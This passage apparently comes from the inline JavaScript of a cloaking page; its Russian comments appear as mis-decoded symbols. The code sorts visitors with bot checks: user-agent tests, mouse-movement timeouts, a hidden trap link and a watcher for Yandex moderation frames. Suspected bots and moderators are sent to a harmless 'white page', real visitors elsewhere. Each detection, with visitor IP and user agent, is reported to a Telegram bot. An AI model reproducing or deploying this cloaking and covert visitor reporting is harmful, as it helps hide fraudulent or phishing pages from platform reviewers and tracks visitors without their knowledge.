            blockReason = "–û–±–Ω–∞—Ä—É–∂–µ–Ω –ø–æ–∏—Å–∫–æ–≤—ã–π –±–æ—Ç (UA, —Ä–∞–Ω–Ω—è—è –ø—Ä–æ–≤–µ—Ä–∫–∞)";
            // –°–æ–±–∏—Ä–∞–µ–º –º–∏–Ω–∏–º–∞–ª—å–Ω—É—é –∏–Ω—Ñ—É –¥–ª—è –æ—Ç—á–µ—Ç–∞
            const earlyInfo = { userAgent: userAgent, timestamp: new Date().toISOString(), deviceType: isMobile ? '–ú–æ–±' : '–ü–ö', ipAddress: '–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ...' };
            sendTelegramReport(blockReason, earlyInfo); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç—á–µ—Ç
            redirect(WHITE_PAGE); // –†–µ–¥–∏—Ä–µ–∫—Ç
            // –ï—Å–ª–∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–Ω, –¥–∞–ª—å–Ω–µ–π—à–µ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞ –Ω–µ –Ω—É–∂–Ω–æ
            return;
        }
        // --- –ö–æ–Ω–µ—Ü —Ä–∞–Ω–Ω–µ–π –ø—Ä–æ–≤–µ—Ä–∫–∏ ---


        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ DOM
        document.addEventListener('DOMContentLoaded', async () => {
            logDebug("DOMContentLoaded —Å—Ä–∞–±–æ—Ç–∞–ª–æ.");
            humanVerificationBlock = document.querySelector('.human-verification');

            // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –Ω–∞–±–ª—é–¥–∞—Ç–µ–ª—è –∑–∞ iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏ (–µ—Å–ª–∏ –≤–∫–ª—é—á–µ–Ω–æ)
            if (config.desktop.CheckYandexModerator || config.mobile.CheckYandexModerator) {
                setupModerationFrameObserver();
            }

            // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤
            if (isMobile) {
                hadMouseMovement = true; // –°—á–∏—Ç–∞–µ–º, —á—Ç–æ –¥–≤–∏–∂–µ–Ω–∏–µ –µ—Å—Ç—å
                if (humanVerificationBlock) humanVerificationBlock.classList.add('hidden');
                logDebug("–ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ, —Å–∫—Ä—ã—Ç–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ –º—ã—à–∏.");
                const target = await determineRedirectTarget(); // –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ü–µ–ª—å
                redirect(target); // –†–µ–¥–∏—Ä–µ–∫—Ç–∏–º
            }
            // –î–ª—è –¥–µ—Å–∫—Ç–æ–ø–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤
            else {
                if (!humanVerificationBlock) {
                     console.error("–ë–ª–æ–∫ .human-verification –Ω–µ –Ω–∞–π–¥–µ–Ω!");
                     // –ï—Å–ª–∏ –±–ª–æ–∫–∞ –Ω–µ—Ç, –Ω–æ –ø—Ä–æ–≤–µ—Ä–∫–∞ –º—ã—à–∏ –≤–∫–ª—é—á–µ–Ω–∞, —Å—Ä–∞–∑—É —Å—á–∏—Ç–∞–µ–º –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–º
                     if(config.desktop.CheckMouseMovement && !redirectInitiated) {
                         logDebug("–ë–ª–æ–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏ –º—ã—à–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω, —Å—á–∏—Ç–∞–µ–º –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–º.");
                         blockReason = "–û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –±–ª–æ–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –º—ã—à–∏";
                         await collectUserInfo(); // –°–æ–±—Ä–∞—Ç—å –∏–Ω—Ñ–æ –¥–ª—è –æ—Ç—á–µ—Ç–∞
                         await sendTelegramReport(blockReason, userInfo);
                         redirect(WHITE_PAGE);
                         return; // –í—ã—Ö–æ–¥
                     }
                }

                // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏, –µ—Å–ª–∏ –≤–∫–ª—é—á–µ–Ω–æ
                if (config.desktop.CheckMouseMovement) {
                    logDebug(`–£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ç–∞–π–º–∞—É—Ç–∞ (${config.desktop.MouseMovementTimeout} –º—Å) –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏.`);
                    // –û—á–∏—â–∞–µ–º —Å—Ç–∞—Ä—ã–π —Ç–∞–π–º–µ—Ä, –µ—Å–ª–∏ –æ–Ω –≤–¥—Ä—É–≥ –µ—Å—Ç—å
                    if (mouseMoveTimeout) clearTimeout(mouseMoveTimeout);

                    mouseMoveTimeout = setTimeout(async () => {
                        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Ä–µ–¥–∏—Ä–µ–∫—Ç –µ—â–µ –Ω–µ –Ω–∞—á–∞–ª—Å—è –ø–æ –¥—Ä—É–≥–æ–π –ø—Ä–∏—á–∏–Ω–µ
                        if (!hadMouseMovement && !redirectInitiated) {
                            logDebug("–¢–∞–π–º–∞—É—Ç! –î–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏ –Ω–µ –±—ã–ª–æ.");
                            blockReason = "–û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏ (—Ç–∞–π–º–∞—É—Ç)";
                            if (!userInfo) await collectUserInfo(); // –°–æ–±—Ä–∞—Ç—å –∏–Ω—Ñ–æ, –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
                            await sendTelegramReport(blockReason, userInfo);
                            redirect(WHITE_PAGE);
                        } else {
                             logDebug("–¢–∞–π–º–∞—É—Ç –º—ã—à–∏: –¥–≤–∏–∂–µ–Ω–∏–µ –±—ã–ª–æ –∏–ª–∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç —É–∂–µ –∏–¥–µ—Ç.");
                        }
                    }, config.desktop.MouseMovementTimeout);
                } else {
                    // –ï—Å–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ –º—ã—à–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∞, –Ω–æ —ç—Ç–æ –¥–µ—Å–∫—Ç–æ–ø, –∑–∞–ø—É—Å–∫–∞–µ–º –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ü–µ–ª–∏ —Å—Ä–∞–∑—É
                    logDebug("–ü—Ä–æ–≤–µ—Ä–∫–∞ –º—ã—à–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∞ –¥–ª—è –¥–µ—Å–∫—Ç–æ–ø–∞, –æ–ø—Ä–µ–¥–µ–ª—è–µ–º —Ü–µ–ª—å...");
                    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Ä–µ–¥–∏—Ä–µ–∫—Ç –µ—â–µ –Ω–µ –Ω–∞—á–∞–ª—Å—è
                    if (!redirectInitiated) {
                        const target = await determineRedirectTarget();
                        redirect(target);
                    }
                }
            }
        });

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏ (—Ç–æ–ª—å–∫–æ –¥–ª—è –¥–µ—Å–∫—Ç–æ–ø–∞)
        if (!isMobile) {
            const handleMouseMove = async () => {
                // –°—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Ä–∞–∑ –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –¥–≤–∏–∂–µ–Ω–∏–∏
                if (!hadMouseMovement && !redirectInitiated) {
                    hadMouseMovement = true;
                    logDebug("–û–±–Ω–∞—Ä—É–∂–µ–Ω–æ –¥–≤–∏–∂–µ–Ω–∏–µ –º—ã—à–∏.");
                    if (humanVerificationBlock) humanVerificationBlock.classList.add('hidden');

                    // –û—á–∏—â–∞–µ–º —Ç–∞–π–º–∞—É—Ç –æ–∂–∏–¥–∞–Ω–∏—è –¥–≤–∏–∂–µ–Ω–∏—è
                    if (mouseMoveTimeout) {
                        clearTimeout(mouseMoveTimeout);
                        mouseMoveTimeout = null;
                        logDebug("–¢–∞–π–º–∞—É—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ –º—ã—à–∏ –æ—Ç–º–µ–Ω–µ–Ω.");
                    }

                    // –ó–∞–ø—É—Å–∫–∞–µ–º –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ü–µ–ª–∏ –∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç –ø–æ—Å–ª–µ –¥–≤–∏–∂–µ–Ω–∏—è
                    // (–¢–∞–π–º–µ—Ä –Ω—É–∂–µ–Ω, —á—Ç–æ–±—ã –Ω–µ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏—Ç—å –º–≥–Ω–æ–≤–µ–Ω–Ω–æ –ø—Ä–∏ —Å–ª—É—á–∞–π–Ω–æ–º –¥–≤–∏–∂–µ–Ω–∏–∏)
                    if (!redirectTimeout) {
                         redirectTimeout = setTimeout(async () => {
                            logDebug("–ó–∞–ø—É—Å–∫ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Ü–µ–ª–∏ –ø–æ—Å–ª–µ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏...");
                            const target = await determineRedirectTarget();
                            // –†–µ–¥–∏—Ä–µ–∫—Ç–∏–º, –µ—Å–ª–∏ —Ü–µ–ª—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∞ –∏ –Ω–µ —Ä–∞–≤–Ω–∞ null (null –µ—Å–ª–∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç —É–∂–µ –∏–¥–µ—Ç)
                            if(target) {
                                redirect(target);
                            }
                        }, 50); // –ö–æ—Ä–æ—Ç–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –ø–æ—Å–ª–µ –ø–µ—Ä–≤–æ–≥–æ –¥–≤–∏–∂–µ–Ω–∏—è
                    }
                }
            };
            // –ò—Å–ø–æ–ª—å–∑—É–µ–º { once: true } –¥–ª—è –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏, —Å—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –æ–¥–∏–Ω —Ä–∞–∑
            document.addEventListener('mousemove', handleMouseMove, { once: true, passive: true });
        }

        // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≤—É—à–∫–∏ –¥–ª—è –±–æ—Ç–æ–≤
        const trapLink = document.querySelector('.bot-trap-link');
        if (trapLink) {
            trapLink.addEventListener('click', async (e) => {
                e.preventDefault();
                if (botTrapActivated || redirectInitiated) return; // –ù–µ —Ä–µ–∞–≥–∏—Ä–æ–≤–∞—Ç—å –ø–æ–≤—Ç–æ—Ä–Ω–æ –∏–ª–∏ –µ—Å–ª–∏ —É–∂–µ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏–º
                botTrapActivated = true;
                blockReason = "–ö–ª–∏–∫ –ø–æ –ª–æ–≤—É—à–∫–µ –¥–ª—è –±–æ—Ç–æ–≤ (.bot-trap-link)";
                logDebug(`üö® ${blockReason}!`);
                if (!userInfo) await collectUserInfo(); // –°–æ–±—Ä–∞—Ç—å –∏–Ω—Ñ–æ, –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
                await sendTelegramReport(blockReason, userInfo);
                redirect(WHITE_PAGE); // –ù–µ–º–µ–¥–ª–µ–Ω–Ω—ã–π —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ –±–µ–ª—É—é
            });
        } else {
            console.warn("–≠–ª–µ–º–µ–Ω—Ç .bot-trap-link –Ω–µ –Ω–∞–π–¥–µ–Ω.");
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Ä–∞–Ω–Ω–µ–≥–æ —É—Ö–æ–¥–∞
        window.addEventListener('beforeunload', () => {
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –Ω–µ –±—ã–ª–∞ –ø–æ–ª–Ω–æ—Å—Ç—å—é –∑–∞–≥—Ä—É–∂–µ–Ω–∞ (—Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª)
            // –∏ —á—Ç–æ —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–µ –±—ã–ª –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–Ω –ø–æ –∫–∞–∫–æ–π-–ª–∏–±–æ –ø—Ä–∏—á–∏–Ω–µ
            if (!pageFullyLoaded && !redirectInitiated) {
                logDebug("–ü–æ–ø—ã—Ç–∫–∞ —Ä–∞–Ω–Ω–µ–≥–æ —É—Ö–æ–¥–∞ —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã.");
                const finalBlockReason = blockReason || "–†–∞–Ω–Ω–∏–π —É—Ö–æ–¥ (–ø—Ä–∏—á–∏–Ω–∞ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞)";
                // –°–æ–±–∏—Ä–∞–µ–º –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ —Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ, –µ—Å–ª–∏ –≤–æ–∑–º–æ–∂–Ω–æ
                const earlyInfo = {
                    reason: finalBlockReason,
                    ts: new Date().toISOString(),
                    ua: userAgent.substring(0,100),
                    ip: userInfo?.ipAddress || '?',
                    loadT: Math.round(performance.now() - PAGE_LOAD_START),
                    vCount: visitCount
                };
                const message = `üö™ –£–•–û–î / –ù–ï–ó–ê–í–ï–†–®–ï–ù–ù–´–ô –†–ï–î–ò–†–ï–ö–¢\n–ü—Ä–∏—á–∏–Ω–∞: ${earlyInfo.reason}\nIP: ${earlyInfo.ip}\nUA: ${earlyInfo.ua}...\n–í—Ä–µ–º—è: ${earlyInfo.loadT}–º—Å\n–í–∏–∑–∏—Ç: ${earlyInfo.vCount}`;

                // –ò—Å–ø–æ–ª—å–∑—É–µ–º sendBeacon –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö (–±–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω–æ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏)
                if (navigator.sendBeacon && config.common.TelegramReporting) {
                    const blob = new Blob([JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    })], { type: 'application/json' });
                    try {
                       // sendBeacon –Ω–µ –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ—Ç –¥–æ—Å—Ç–∞–≤–∫—É, –Ω–æ —ç—Ç–æ –ª—É—á—à–∏–π –≤–∞—Ä–∏–∞–Ω—Ç
                       const sent = navigator.sendBeacon(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, blob);
                       logDebug(`–û—Ç—á–µ—Ç –æ —Ä–∞–Ω–Ω–µ–º —É—Ö–æ–¥–µ —á–µ—Ä–µ–∑ sendBeacon ${sent ? '–æ—Ç–ø—Ä–∞–≤–ª–µ–Ω (–≤ –æ—á–µ—Ä–µ–¥—å)' : '–Ω–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω'}.`);
                    } catch (e) {
                       logDebug("–û—à–∏–±–∫–∞ sendBeacon:", e);
                    }
                }
            } else {
                 logDebug(`Beforeunload: —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞ (${pageFullyLoaded}) –∏–ª–∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–Ω (${redirectInitiated}). –û—Ç—á–µ—Ç –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è.`);
            }
        });

    })();
    </script>

</body>
</html>
